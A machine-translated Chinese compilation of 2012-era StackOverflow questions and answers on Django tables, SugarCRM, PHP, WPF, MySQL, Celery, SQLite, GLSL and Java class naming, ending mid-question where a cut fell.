# StackOverflow 问答 12192000-12192999

# html - django-tables2 每行添加按钮

> ID：12192004
> 
> 赞同：15
> 
> 时间：2012-08-30T07:34:54.967
> 
> 标签：html, django, django-tables2

我正在使用 django-tables 2 渲染一个查询集，但是由于该表是一次渲染的，因此我无法管理以下内容：首先，我应该提到每个查询集的表的行数是不同的，所以我不提前知道它们的确切数量。我需要的是每行有一个按钮，可以将检索到的对象加载到表单的字段中。我用默认方式渲染表格：

```
{% load render_table from django_tables2 %}
{% render_table table %} 
```

当我尝试迭代表的行时，我收到错误“表不可迭代”。

那么如何每行添加一个按钮？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-30T07:38:12.797

您可以在表格中创建一个模板列，这将呈现一些内容，例如一个按钮：

```
class MyTables(tables.Table):
  ...
  my_column = tables.TemplateColumn(verbose_name=_('My Column'),
                                    template_name='app/my_column.html',
                                    orderable=False) # orderable not sortable 
```

在模板 my_column 中，该行位于变量记录中：

```
{{ record.my_field }} 
```

# php - 如何从 SugarCRM 中的表中检索所有记录？

> ID：12192010
> 
> 赞同：5
> 
> 时间：2012-08-30T07:35:34.300
> 
> 标签：php, ajax, sugarcrm

我正在使用 Sugar Pro 6.1，想知道如何从产品表中检索所有带有 id 的产品。我正在尝试使用以下代码

```
$sql = "SELECT id, name FROM products order by name"; 
$result = $GLOBALS["db"]->query($sql);
$products = $GLOBALS["db"]->fetchByAssoc($result); 
```

但它总是只返回第一条记录。

是否可以获取所有带有 id 的产品以在 html 下拉列表中显示它们，我想在 javascript 文件中显示该下拉列表，这就是我使用 ajax 调用和在单独的 php 文件中使用上述代码的原因将输出返回给 ajax 调用。

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-30T12:59:47.033

fetchByAssoc() 一次只抓取一条记录。相反，您需要像这样通过调用 fetchByAssoc() 进行迭代......

```
$sql = "SELECT id, name FROM products order by name"; 
$result = $GLOBALS["db"]->query($sql);
while ( $product = $GLOBALS["db"]->fetchByAssoc($result) ) {
     $products[] = $product;
} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-31T12:08:36.570

您需要排除已删除的产品。

```
$sql = "SELECT id, name FROM products WHERE deleted=0 order by name";
$result = $GLOBALS["db"]->query($sql);
while ( $product = $GLOBALS["db"]->fetchByAssoc($result) ) {
     $products[] = $product;
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-09-04T05:50:33.027

尽管我同意 Pelish8 发布的答案。但这也是从数据库中获取数据的另一种方式

```
global $db;
$sql   =    "SELECT id, name FROM products WHERE deleted=0 order by name";
$result    =    $db->query($sql);
while($product    =    $db->fetchByAssoc($result)){
    $products[] = $product;
} 
```

# php - 如何删除字符串中的“<”、“>”和它们之间的所有文本？

> ID：12192018
> 
> 赞同：0
> 
> 时间：2012-08-30T07:36:06.727
> 
> 标签：php

我有这些示例字符串

```
"<textcolor='red'><h1>FAILED - NOT ENOUGH STEPS PERFORMED</h1></textcolor>"
"<b style='color:white; background-color:red'>FAILED</b>" 
```

我想摆脱那里的所有 HTML 格式，所以我得到了这个

```
"FAILED - NOT ENOUGH STEPS PERFORMED"
"FAILED" 
```

我想摆脱小于和大于符号以及它们之间的任何东西都可以。我知道我可以为此使用 preg_replace，但我不确定要使用什么格式。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-30T07:38:30.883

我在想一些事情：

```
$code = "<textcolor='red'><h1>FAILED - NOT ENOUGH STEPS PERFORMED</h1></textcolor>";
echo strip_tags($code); 
```

上面提到的代码将输出：

```
FAILED - NOT ENOUGH STEPS PERFORMED 
```

没有任何样式，除非样式是从父元素继承的。

[strip_tags 函数](http://php.net/manual/en/function.strip-tags.php)是删除 HTML 中所有标签的最简单、最有效的方法。的目的`preg_replace`是删除或更改更多种类的符号，例如更改以“a”或其他内容开头的任何内容，而 strip_tags 的目的是专门清理 HTML 输入——无论如何你最有可能需要做的事情。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T07:38:25.680

[strip_tags()](http://php.net/manual/en/function.strip-tags.php)似乎是要走的路。preg_replace 可能能够做到这一点，但使其可靠会相当复杂。

# wpf - 如何确保我的应用程序只有一个正在运行的实例？

> ID：12192020
> 
> 赞同：0
> 
> 时间：2012-08-30T07:36:12.380
> 
> 标签：wpf

我在 WPF 中创建了一个小程序。当我运行我的 exe 文件时，它将正确打开我的应用程序。但是，当我再次运行我的 exe 时，它​​会再次打开。我只希望它运行一次。

我搜索了这个问题的解决方案，我得到了一些这样的代码：

```
System.Diagnostics.Process.GetCurrentProcess().Kill(); 
```

此代码将关闭所有应用程序。但是，我需要的是，当我一次又一次地运行我的 exe 时，将只有一个应用程序实例。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T07:42:54.383

如果我理解正确，您希望应用程序在再次打开同一个文件时只打开一次。

这样做的一种方法不是杀死一个进程（这可能会损坏文件），而是立即关闭新打开的应用程序。

将打开的文件列表保留在中心位置（注册表、文件），并在应用程序启动时检查文件是否已经在列表中。如果它关闭新启动的应用程序。

您可以尝试添加一些代码，将包含所请求文件的应用程序带到桌面顶部。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T07:59:38.220

您可以使用[Mutex](http://msdn.microsoft.com/en-us/library/system.threading.mutex.aspx)类。

*   **由于每个系统可能**始终只存在**一个**具有特定名称的 Mutex ，因此您可以**在**第一次应用程序启动时实例化它。
*****   您可以在每次启动应用程序时检查应用程序实例是否**可以拥有互斥锁。***   如果没有，您知道应用程序的另一个实例已经存在，并且可以优雅地关闭新实例。****

 ****使用`Mutex`它非常简单明了。

```
using System;
using System.Threading;

public class Test
{
    public static void Main()
    {
        // Set this variable to false if you do not want to request  
        // initial ownership of the named mutex. 
        bool requestInitialOwnership = true;
        bool mutexWasCreated;

        // Request initial ownership of the named mutex by passing 
        // true for the first parameter. Only one system object named  
        // "MyMutex" can exist; the local Mutex object represents 
        // this system object. If "MyMutex" is created by this call,
        // then mutexWasCreated contains true; otherwise, it contains 
        // false.
        Mutex m = new Mutex(requestInitialOwnership, 
                            "MyMutex", 
                            out mutexWasCreated);

        // This thread owns the mutex only if it both requested  
        // initial ownership and created the named mutex. Otherwise, 
        // it can request the named mutex by calling WaitOne. 
        if (!(requestInitialOwnership && mutexWasCreated))
        {
           // The mutex is already owned by another application instance.
           // Close gracefully.

           // Put your exit code here...
           // For WPF, this would be Application.Current.Shutdown();
           // (Obviously, that would not work in this Console example.. :-) )
        }

        // Your application code here...
    }
} 
```****

# php - 谷歌分析 PHP API 返回空值

> ID：12192028
> 
> 赞同：2
> 
> 时间：2012-08-30T07:36:42.657
> 
> 标签：php, multidimensional-array, google-analytics, google-analytics-api

当我向谷歌分析执行 API 请求时，我经常得不到任何数据。有时它有效，而其他时候它只是没有。

我的 API 调用如下所示：

```
public function get_pageviews( )
    {
        $result = $this->service->data_ga->get(
            'ga:' . $this->profile_id,                                      // report id
            $this->convert_time( "-".$this->timespan." days", "Y-m-d" ),    // start date
            $this->convert_time( $this->end, "Y-m-d" ),                     // end date
            "ga:pageviews",                                                 // metrics
            array( "dimensions" => "ga:date" )                              // other...
        );
        return $result;
    } 
```

正确的输出是：

```
 ["totalsForAllResults"]=>
  array(1) {
    ["ga:pageviews"]=>
    string(4) "1503"
  }
  ["rows"]=>
  array(8) {
    [0]=>
    array(2) {
      [0]=>
      string(8) "20120823"
      [1]=>
      string(3) "333"
    }
    [1]=>
    array(2) {
      [0]=>
      string(8) "20120824"
      [1]=>
      string(3) "185"
    }
    [2]=>
    array(2) {
      [0]=>
      string(8) "20120825"
      [1]=>
      string(2) "52"
    }
    [3]=>
    array(2) {
      [0]=>
      string(8) "20120826"
      [1]=>
      string(3) "110"
    }
    [4]=>
    array(2) {
      [0]=>
      string(8) "20120827"
      [1]=>
      string(3) "335"
    }
    [5]=>
    array(2) {
      [0]=>
      string(8) "20120828"
      [1]=>
      string(3) "222"
    }
    [6]=>
    array(2) {
      [0]=>
      string(8) "20120829"
      [1]=>
      string(3) "257"
    }
    [7]=>
    array(2) {
      [0]=>
      string(8) "20120830"
      [1]=>
      string(1) "9"
    }
  } 
```

没有数据的错误输出是：

```
["totalsForAllResults"]=>
  array(1) {
    ["ga:pageviews"]=>
    string(1) "0"
  }
  ["rows"]=>
  array(8) {
    [0]=>
    array(2) {
      [0]=>
      string(8) "20120823"
      [1]=>
      string(1) "0"
    }
    [1]=>
    array(2) {
      [0]=>
      string(8) "20120824"
      [1]=>
      string(1) "0"
    }
    [2]=>
    array(2) {
      [0]=>
      string(8) "20120825"
      [1]=>
      string(1) "0"
    }
    [3]=>
    array(2) {
      [0]=>
      string(8) "20120826"
      [1]=>
      string(1) "0"
    }
    [4]=>
    array(2) {
      [0]=>
      string(8) "20120827"
      [1]=>
      string(1) "0"
    }
    [5]=>
    array(2) {
      [0]=>
      string(8) "20120828"
      [1]=>
      string(1) "0"
    }
    [6]=>
    array(2) {
      [0]=>
      string(8) "20120829"
      [1]=>
      string(1) "0"
    }
    [7]=>
    array(2) {
      [0]=>
      string(8) "20120830"
      [1]=>
      string(1) "0"
    }
  } 
```

如您所见，多维数组**行**不是空的，但数组中的值设置为 0，而它与我使用 Google Analtyics API 发送的请求完全相同。

我的请求中是否缺少任何内容或我做错了什么？

# php - 在 MySql 中搜索法语口音

> ID：12192031
> 
> 赞同：1
> 
> 时间：2012-08-30T07:36:45.887
> 
> 标签：php, mysql

> **可能重复：**
> [如何在 MySql 中进行口音敏感搜索](https://stackoverflow.com/questions/500826/how-to-conduct-an-accent-sensitive-search-in-mysql)

我有一个 MySQL 数据库，其中包含一个表中包含法语和英语字母的单词列表。

**例如：** 存储在数据库中的数据如下：

## 编号 | 字

1.  rççl
2.  回复
3.  rçgi

我搜索过这样的查询

```
 SELECT id, words  FROM `dictionary` WHERE `words` LIKE '_ç__' 
```

## 所以我得到了以下结果ID | 字

1.  rççl
2.  回复
3.  rçgi

在那个查询中，我搜索了法语字母。所以结果是正确的。

但如果我搜索了以下查询，

```
SELECT id, words  FROM `dictionary` WHERE `words` LIKE '_c__' 
```

## 结果是相同的ID | 字

1.  rççl
2.  回复
3.  rçgi

**所以我的问题是如何区分这些字母以及我需要在程序或查询中更改什么？请帮忙 ？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T07:53:24.133

您将要使用具有任何选择的[区分大小写/二进制格式的](http://dev.mysql.com/doc/refman/5.0/en/charset-collation-names.html)[COLLATE 子句](http://dev.mysql.com/doc/refman/5.0/en/charset-collate.html)对不起，我不知道法语口音的最佳排序规则。

# android - Admob：如何在视图中执行点击

> ID：12192035
> 
> 赞同：0
> 
> 时间：2012-08-30T07:37:00.703
> 
> 标签：android, listview, admob

如何在我的 admob 视图中执行点击？

`admobview.performclick();`不起作用。

此视图位于带有 的列表中`ListItemlistener`，因此我必须手动执行此操作

谢谢你的帮助

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-30T07:49:59.783

您***绝不***应该对您的 AdMob 视图进行点击。这直接违反了使用条款。

# python - Celery 周期性任务作为 Python 的守护进程

> ID：12192036
> 
> 赞同：2
> 
> 时间：2012-08-30T07:37:05.767
> 
> 标签：python, celery

我想在 Ubuntu 实例上设置一个简单的 python 应用程序作为定期 celery 任务。我已按照 Celery 文档的建议设置结构：

```
proj/__init__.py
/celery.py
/tasks.py 
```

这工作正常，我可以使用 ../proj 运行定期任务：

```
celery worker -B --app=proj 
```

然后我复制了 celeryd 和 celerybeat 文件并编辑了默认文件。

但是，当我启动守护程序时，celeryd 运行但似乎没有找到 celery.py 配置并记录连接被拒绝错误。

我认为它必须与以下路径有关：

```
#/etc/default/celeryd:

# Where to chdir at start.
CELERYD_CHDIR="/home/user/"

CELERY_CONFIG_MODULE="/home/user/proj" 
```

除了更改 CELERYD_USER 之外，我还保留了文档中指定的其他设置。

我觉得我也应该在配置中使用 --app 并且可能指定我的 python 环境，但我不确定在哪里或如何（我没有运行虚拟环境）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T01:27:10.363

我现在正在为同样的事情而苦苦挣扎。这就是我的看法：

执行任务的通信应用程序和执行任务的worker有两端。

**工人不需要知道应用程序！**对于工人部分来说，了解 celeryconfig 就足够了。您可以使用 celery worker --config=mypackage.celeryconfig 传递它。工作人员将使用 BROKER_URL 连接到队列。记得在那里声明 CELERY_IMPORTS 以便工人知道在哪里寻找任务定义。

客户端应用程序必须知道将其请求发送到何处。因此必须使用传递配置文件的方法之一传递相同的配置。我选了这个：

```
from __future__ import absolute_import

from celery import Celery
celery = Celery()
import backend.async.celeryconfig
celery.config_from_object(backend.async.celeryconfig) 
```

当我在没有守护程序的情况下运行它时，此设置对我有用，但由于某种原因，守护程序会忽略我的 CELERY_CONFIG_MODULE 设置。

* * *

**更新：**

**CELERY_CONFIG_MODULE 不在任何地方的 /etc/init.d/celeryd 脚本中使用**！

相反，我把它放在 CELERYD_OPTS 中，它就像一个魅力。：

```
CELERYD_OPTS="--config=backend.async.celeryconfig" 
```

另一件事是 VIRTUAL_ENV 变量在 celeryd 脚本中也被忽略了。另一方面，celerybeat scirpt 激活了虚拟环境，所以我建议的配置是：

```
CELERYBEAT_OPTS="--schedule=/var/run/celerybeat-schedule --config=backend.async.celeryconfig"

VIRTUAL_ENV="/path/to/.virtualenvs/your_env"

# Python interpreter from environment.
ENV_PYTHON="$VIRTUAL_ENV/bin/python"

# How to call "celeryd-multi"
CELERYD_MULTI="$VIRTUAL_ENV/bin/celeryd-multi"

#CELERYD="$VIRTUAL_ENV/celeryd"

# How to call "celeryctl"
CELERYCTL="$VIRTUAL_ENV/bin/celeryctl"

# How to call "celerybeat"
CELERYBEAT="$VIRTUAL_ENV/bin/celerybeat" 
```

# php - PHP Excel Writer 自动换行

> ID：12192037
> 
> 赞同：1
> 
> 时间：2012-08-30T07:37:07.173
> 
> 标签：php, spreadsheet-excel-writer

我正在使用这个插件，我知道它不是最好的，但我没有时间重写所有这些脚本。我需要知道如何启用文本换行。网站上不[完整的文档](http://pear.php.net/manual/en/package.fileformats.spreadsheet-excel-writer.spreadsheet-excel-writer-format.settextwrap.php)根本没有帮助。

我尝试使用 1 和 'wrap' 作为数组中的参数，但没有运气。

有没有人让这个工作？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2016-08-25T09:36:28.507

如果您想使用构造 addFormat()，则 wrapText 属性的名称必须是 'wrap'。

你写道：*'textWrap' => 1*

你应该：*'wrap' => true 或 'wrap' => 1*

例如：

```
$style = array(
    'alignment' => array(
        'horizontal' => PHPExcel_Style_Alignment::HORIZONTAL_CENTER,
        'wrap' => true
    )
);
$objPHPExcel->getActiveSheet()->getStyle('A1')->applyFromArray($style); 
```

单元格**A1**的结果是文本环绕的中心对齐

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:22:16.007

好的，想通了。我试图这样做：

```
$format_caption =& $workbook->addFormat(array('size' => 11, 'fontFamily' => 'Calibri', 'numformat' => '@', 'bold' => 1, 'left' => 1, 'top' => 1, 'bottom' => 1, 'right' => 1, 'vAlign' => 'vcenter', 'align' => 'center', 'fgcolor' => 50, 'textWrap' => 1)); 
```

但是设置`'textWrap' => 1`不起作用。

所以我稍微改了一下：

```
$format_caption =& $workbook->addFormat(array('size' => 11, 'fontFamily' => 'Calibri', 'numformat' => '@', 'bold' => 1, 'left' => 1, 'top' => 1, 'bottom' => 1, 'right' => 1, 'vAlign' => 'vcenter', 'align' => 'center', 'fgcolor' => 50));
$format_caption -> setTextWrap(); 
```

这解决了我的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-10-27T03:23:31.823

textWrap 不起作用，因为您设置了 ROW 高度，例如：

```
$worksheet -> setRow($numRow, 17); 
```

删除此行，行高将自动计算。

# android - Android - 使用 Content Provider 加入查询

> ID：12192039
> 
> 赞同：4
> 
> 时间：2012-08-30T07:37:12.817
> 
> 标签：android, android-contentprovider

如何在 android 中使用内容提供者加入/比较查询。这可能吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-30T08:41:31.100

根据两个表之间的关系，我通常应用以下任何解决方案，我在库项目中记录了这些解决方案，您通常可以通过该解决方案公开所有项目外部可用的接口（如内容提供者）：

*   如果表 A 包含的信息如果不将其与表 BI 连接起来就几乎不会感兴趣.

*   如果表 A 和 B 包含应该可以单独查询的数据（我的意思是：没有 JOIN），那么我通常会提供一个额外的 URI，例如在我的库中名为 A_JOIN_B_URI，当被查询时，它会返回 JOIN的两个表。同样，您将其记录在您的库中。

可能有比这更多的选项，但我认为这些选项最符合 ContentProvider 的概念：一个不知道在其背后实现什么数据存储的接口。无论您在何处显式使用底层数据存储的功能，现在都可以通过看起来怪异的“帮助 URI”来清楚地说明这一点。

欢迎对此发表任何评论，也许我可以学到一两件事..

# mysql - MySQL 查询遇到问题

> ID：12192041
> 
> 赞同：6
> 
> 时间：2012-08-30T07:37:13.757
> 
> 标签：mysql, sql, database

需要生成课程列表和计数

1.  全部
2.  未答复
3.  已回答但未选中

问题。

这是我的查询

```
SELECT c.id, 
    c.name, 
    COUNT(allq.id) 'All', 
    COUNT(unanswered.id) 'Unanswered',
    COUNT(unchecked.id) 'Unchecked'
FROM courses c
LEFT JOIN `courses-lessons` cl 
    ON c.id = cl.cid
LEFT JOIN lesson_questions allq 
    ON cl.id = allq.lid
LEFT JOIN
(
    SELECT q.id, a.qid, q.lid
    FROM lesson_questions q
    LEFT JOIN 
    (
        SELECT id, qid
        FROM answers
        WHERE id NOT IN (SELECT aid FROM answer_chk_results)
    ) a 
        ON q.id = a.qid 
) unchecked 
    ON cl.id = unchecked.lid
LEFT JOIN
(
    SELECT id
    FROM lesson_questions
    WHERE id NOT IN (SELECT qid FROM answers)
) unanswered 
    ON cl.id = unchecked.lid
GROUP BY c.id, c.name 
```

这是一个[SQL Fiddle](http://sqlfiddle.com/#!2/d23b4/5)

数据库结构

[https://docs.google.com/open?id=0B9ExyO6ktYcOenZ1WlBwdlY2R3c](https://docs.google.com/open?id=0B9ExyO6ktYcOenZ1WlBwdlY2R3c)

我添加了 3 个问题作为示例数据，但查询计算所有问题并返回 9。这是不可能的。出了点问题。想不通，我错过了什么。

# 更新

我将解释一些表格：

1.  `answer_chk_results`- 检查答案表。因此，如果此表上不存在某些答案，则表示未选中
2.  `lesson_questions`- 课程 <-> 问题关联（按 id）表
3.  `courses-lessons`- 课程 <-> 课程关联（按 id）表

只有第一个问题似乎并不难：当然，要计算所有问题的数量，我的计划如下所示：

1.  首先，我们需要获取所有课程名称列表。查询将如下所示：

    从课程 c 中选择 c.id、c.name

2.  然后`courses-lessons`通过每个选定的课程从关联表中获取所有课程`1.`（不知道如何继续之前的查询）

3.  然后，按所选课程 ID（列）计算**所有问题**`lid``2.`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-30T07:50:35.977

您可以通过使用条件计数语句来做到这一点，因此您不需要所有子查询：

```
SELECT  c.ID,
        c.Name,
        COUNT(DISTINCT q.ID) AS Questions,
        COUNT(DISTINCT CASE WHEN a.ID IS NULL THEN q.ID END) AS UnAnswered,
        COUNT(DISTINCT CASE WHEN cr.ID IS NULL AND a.ID IS NOT NULL THEN q.ID END) AS UnChecked
FROM    Courses c
        LEFT JOIN `Courses-Lessons` cl
            ON cl.CID = c.ID
        LEFT JOIN Lesson_Questions q
            ON cl.ID = q.LID
        LEFT JOIN Answers a
            ON a.QID = q.ID
        LEFT JOIN Answer_chk_results cr
            ON a.ID = cr.AID
GROUP BY c.ID --, c.Name 
```

**[SQL小提琴](http://sqlfiddle.com/#!2/d23b4/18)**

* * *

**编辑**

```
SELECT  c.ID,
        c.Name,
        COUNT(DISTINCT q.ID) AS Questions,
        COUNT(DISTINCT CASE WHEN a.ID IS NULL THEN q.ID END) AS UnAnswered,
        COUNT(a.ID) AS Answers,
        COUNT(DISTINCT CASE WHEN cr.ID IS NULL THEN a.ID END) AS UnChecked
FROM    Courses c
        LEFT JOIN `Courses-Lessons` cl
            ON cl.CID = c.ID
        LEFT JOIN Lesson_Questions q
            ON cl.LID = q.LID
        LEFT JOIN Answers a
            ON a.QID = q.QID
        LEFT JOIN Answer_chk_results cr
            ON a.ID = cr.AID
GROUP BY c.ID, c.Name 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-30T07:59:21.343

也许 - [http://sqlfiddle.com/#!2/d23b4/42](http://sqlfiddle.com/#!2/d23b4/42)

```
SELECT  c.ID,
        c.Name,
        COUNT(q.ID) AS 'Questions',
        SUM(CASE WHEN a.ID IS NOT NULL Then 1 ELSE 0 END ) as 'Unanswered',
        SUM(CASE WHEN cr.ID IS NOT NULL Then 1 ELSE 0 END ) as 'Unchecked'
FROM    Courses c
        LEFT JOIN `Courses-Lessons` cl
            ON cl.CID = c.ID
        LEFT JOIN Lesson_Questions q
            ON cl.ID = q.LID
        LEFT JOIN Answers a         
            ON a.QID = q.ID             
        LEFT JOIN Answer_chk_results cr
            ON a.ID = cr.AID
GROUP BY c.ID 
```

# opengl - 确定相邻像素的纹理位置

> ID：12192045
> 
> 赞同：3
> 
> 时间：2012-08-30T07:37:23.670
> 
> 标签：opengl, glsl

是否`varying`可以确定片段着色器中相邻像素的值是多少？

我`varying vec2`在我的顶点着色器中设置 a 并在片段着色器中使用它`texture2d`。我想在片段着色器中做的是查看纹理中的相邻值。但是，我想根据最终的窗口坐标进行查看。例如，如果我在像素 10，我想知道在 11 时我会得到什么纹理值。

也就是说，我想知道特定变化的步进值是多少，这可能吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-30T08:04:50.340

您无法获得有关相邻片段的变化（或其他变量）值的任何信息。但是，如果您只想知道相邻片段之间的值的变化率，无论是变量还是任何其他变量（在您的情况下可能是从纹理中采样的颜色），您可以使用[`dFdx`and`dFdy`函数](http://www.opengl.org/sdk/docs/manglsl/xhtml/dFdx.xml)，这将最可能只是在幕后为您做有限差分（因为硬件知道相邻片段的值）。

# ios - SQLite 语句 INSERT OR REPLACE INTO 我不清楚

> ID：12192049
> 
> 赞同：2
> 
> 时间：2012-08-30T07:37:29.403
> 
> 标签：ios, sqlite

`INSERT OR REPLACE INTO`如果该行已经存在，SQLite 语句将替换该行。但是当我一次又一次地运行相同的语句时，它会继续插入而不是替换。

REPLACE 在什么情况下实际发生？

```
INSERT OR REPLACE INTO names (rollno, name) VALUES (1, "Adam") 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-30T07:44:01.870

如果要插入的行与表中的另一行具有相同的 PRIMARY KEY，则会发生替换。您可能忘记定义主键。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-30T10:22:46.263

Values will be replaced in some row if a `UNIQUE` violation occurs, as is explained in the [documentation](http://www.sqlite.org/lang_conflict.html):

> When a UNIQUE constraint violation occurs, the REPLACE algorithm deletes pre-existing rows that are causing the constraint violation prior to inserting or updating the current row and the command continues executing normally. If a NOT NULL constraint violation occurs, the REPLACE conflict resolution replaces the NULL value with he default value for that column, or if the column has no default value, then the ABORT algorithm is used. If a CHECK constraint violation occurs, the REPLACE conflict resolution algorithm always works like ABORT.

I presume that the column that you would to make `UNIQUE` is `rollno`. You can make it unique by making it the `PRIMARY KEY` of the table, or by simply creating a [`UNIQUE` constrain](http://www.sqlite.org/lang_createtable.html#uniqueconst) on it.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T09:00:00.447

哈哈哈，哦，伙计，我从哪里开始？

当我经历这个 SQL 地狱时，我正在诅​​咒计算机。

谢天谢地，我设法让它工作！:D

我从 INSERT OR REPLACE INTO 语句中学到的一件事是你需要做一件超级关键的事情：

```
Mark one column of your table as "UNIQUE" during SQL table creation. 
```

这是一个示例（**滚动到右端**）：

```
NSString *strEvents = @"CREATE TABLE Events (eventid INTEGER PRIMARY KEY, nodeID INTEGER, title VARCHAR(255), description TEXT, eventTime VARCHAR(255), eventDate VARCHAR(255), eventLocation VARCHAR(255), imagePaths TEXT, bookingURL TEXT, UNIQUE(nodeID));"; 
```

在上面的示例中，我已将“nodeID”列标记为唯一。

一旦你这样做了，你可以像这样使用它：

```
-(void)batchSaveEvents:(NSMutableArray *)paramList
{
    @synchronized(self)
    {
        if(self.isConnected == YES)
        {
            const char *sql = "INSERT OR REPLACE INTO Events (nodeID,title,description,eventTime,eventDate,eventLocation,imagePaths,bookingURL) VALUES (?,?,?,?,?,?,?,?);";

            sqlite3_stmt *stmtSave;

            if(sqlite3_prepare(objDatabase, sql, -1, &stmtSave, NULL) != SQLITE_OK)
            {
                //NSLog(@"FAILED %s", sqlite3_errmsg(objDatabase));

                return;
            }

            int listIndex = 0;        

            sqlite3_exec(objDatabase, "BEGIN IMMEDIATE TRANSACTION", 0, 0, 0); // Begin Trasaction

            for(listIndex = 0; listIndex < [paramList count]; listIndex++)
            {
                sqlite3_bind_int(stmtSave, 1, [[(Event *)[paramList objectAtIndex:listIndex] nodeID] intValue]);
                sqlite3_bind_text(stmtSave, 2, [[(Event *)[paramList objectAtIndex:listIndex] title] UTF8String], -1, SQLITE_TRANSIENT);
                sqlite3_bind_text(stmtSave, 3, [[(Event *)[paramList objectAtIndex:listIndex] description] UTF8String], -1, SQLITE_TRANSIENT);
                sqlite3_bind_text(stmtSave, 4, [[(Event *)[paramList objectAtIndex:listIndex] eventTime] UTF8String], -1, SQLITE_TRANSIENT);
                sqlite3_bind_text(stmtSave, 5, [[(Event *)[paramList objectAtIndex:listIndex] eventDate] UTF8String], -1, SQLITE_TRANSIENT);
                sqlite3_bind_text(stmtSave, 6, [[(Event *)[paramList objectAtIndex:listIndex] eventLocation] UTF8String], -1, SQLITE_TRANSIENT);

                sqlite3_bind_text(stmtSave, 7, [[(Event *)[paramList objectAtIndex:listIndex] imagePaths] UTF8String], -1, SQLITE_TRANSIENT);

                sqlite3_bind_text(stmtSave, 8, [[(Event *)[paramList objectAtIndex:listIndex] bookingURL] UTF8String], -1, SQLITE_TRANSIENT);

                sqlite3_step(stmtSave);
                sqlite3_reset(stmtSave);
            }

            sqlite3_exec(objDatabase, "COMMIT", 0, 0, 0); // Commit Transaction

            sqlite3_finalize(stmtSave);
        }
    }
} 
```

祝布鲁达好运！……或者姐姐！

# java - Helper 和 Utility 类之间有什么区别？

> ID：12192050
> 
> 赞同：141
> 
> 时间：2012-08-30T07:37:37.477
> 
> 标签：java

如何确定如何调用类 XHelper 或 XUtils ？

在我心里 ：

**助手类**，是一个可以实例化并做一些业务工作的类

**Utils 类**，是一个静态类，对一种实例执行小而重复的操作（来自 Apache 的 utils 类 ArrayUtils 或 IOUtils 的示例）

* * *

## 回答 #1

> 赞同：128
> 
> 时间：2012-08-30T07:43:41.177

有许多命名样式可供使用。我建议 Utils 只是因为它更常见。

Utility 类被理解为只有静态方法并且是无状态的。您不会创建此类的实例。

Helper 可以是实用程序类，也可以是有状态的或需要创建实例。如果可能的话，我会避免这种情况。

如果您可以使名称更具体。例如，如果它有排序方法，则将其设为 XSorter

对于数组，您可以找到辅助类，例如

```
Array
Arrays
ArrayUtil
ArrayUtils
ArrayHelper 
```

顺便说一句，实用程序类的简写是没有实例的枚举

```
enum XUtils {;
    static methods here
} 
```

如果你需要实现一个接口，我会使用一个无状态的 Singleton。

```
enum XHelper implements RequiredInterface {
   INSTANCE;
   // no instance fields.
} 
```

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2012-08-30T07:38:43.970

一般来说？这完全是任意的。对此没有任何规定。

* * *

## 回答 #3

> 赞同：19
> 
> 时间：2019-01-28T06:41:12.103

实用程序是通用的“叶节点”类。也就是说，它对您的项目没有任何依赖关系，并且可以从一个项目移植到另一个项目，而不会破坏或变得无用。例子：`Vector3`, `RandomNumberGenerator`, `StringMatcher`, 等等...

“帮助者”似乎是任何旨在帮助另一个班级的班级。这些可能取决于您的项目，也可能不取决于您的项目。如果你正在创建一个`GameNetworkClient`类，你可以说这个`GameNetworkConnection`类是一个“帮助者”，因为它“帮助”了`GameNetworkClient`.

开发人员引用工具的方式反映了这些词的常见用法。如果您能回忆起被描述为“有用”与“有用”的听力工具，那么有用的工具往往有一些背景（奶酪刨丝器有助于磨碎奶酪，玉米剥离器有助于剥玉米，高速装载机有助于重新装载枪支）。“实用程序”有望在各种环境中工作（WD-40、胶带、军刀、胶水、手电筒等）。

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2019-10-06T07:36:07.703

正如 Jesper 所说，这**完全是任意**的。您可以考虑什么对您的组织有效，并将其作为惯例。

对我来说，它是这样的：

> **utils** - 静态类，可以在任何地方自由移动和导入。

执行在不同模块中可能有用的一般任务。正如 Peter Lawrey 所说，更*具体*的名称很有用。

> **helper** -*帮助*另一个类或模块的类。

仅在其放置的模块中使用并且在其他地方导入没有意义的任务。因此名称可能更具体 - ***ModuleName* Helper**（例如*AdministrationHelper*，*LoginHelper*）

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-08-30T07:39:47.193

这没有最终的答案。找出一种命名方案并坚持下去。命名你的包和类是软件架构的重要组成部分，没有人可以剥夺你的决定权。

我个人更喜欢 XHelper，但我更经常在外国代码中看到 XUtils。

我也喜欢在 JDK 和[Guava](https://code.google.com/p/guava-libraries/)中都可以找到的“复数”命名方案：

如果一个类处理`Collection`对象，它被称为`Collections`

数组 > 数组 (jdk)
列表 > 列表 (guava)
地图 > 地图 (guava)

等等

# java - 我可以使用 FileNameExtensionFilter 过滤掉文件列表吗？

> ID：12192051
> 
> 赞同：1
> 
> 时间：2012-08-30T07:37:44.607
> 
> 标签：java

我有一个包含许多条目的大型集合：`Set<File> allFiles`.

**使用以下算法迭代此 Set**是否可行？**有更好的方法吗？**

 **```
Set<File> allFiles = // ...100,000+ entries
